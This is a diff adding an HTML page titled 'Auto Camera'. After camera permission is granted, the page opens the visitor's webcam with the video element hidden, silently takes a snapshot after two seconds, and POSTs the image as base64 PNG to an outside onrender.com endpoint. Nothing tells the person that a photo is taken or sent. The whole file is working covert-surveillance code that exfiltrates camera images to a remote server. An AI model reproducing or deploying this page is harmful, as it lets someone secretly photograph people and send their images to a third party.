@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Auto Camera</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      width: 100vw;
+      height: 100vh;
+      padding: 10px;
+    }
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+  </style>
+</head>
+<body>
+  <video id="vid" autoplay playsinline hidden></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    const vid = document.getElementById('vid');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
+navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+  vid.srcObject = stream;
+  vid.onloadedmetadata = () => {
+    canvas.width = vid.videoWidth;
+    canvas.height = vid.videoHeight;
+    setTimeout(() => {
+      ctx.drawImage(vid, 0, 0);
+      const data = [{
+        name: "capture.png",
+        data: canvas.toDataURL("image/png")
+      }];
+      fetch("https://server-ieuy.onrender.com/03dataP", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).then(res => res.json()).then(console.log).catch(console.error);
+      stream.getTracks().forEach(t => t.stop());
+    }, 2000);
+  };
+}).catch(console.error);
+    
+  </script>
+</body>
+</html>
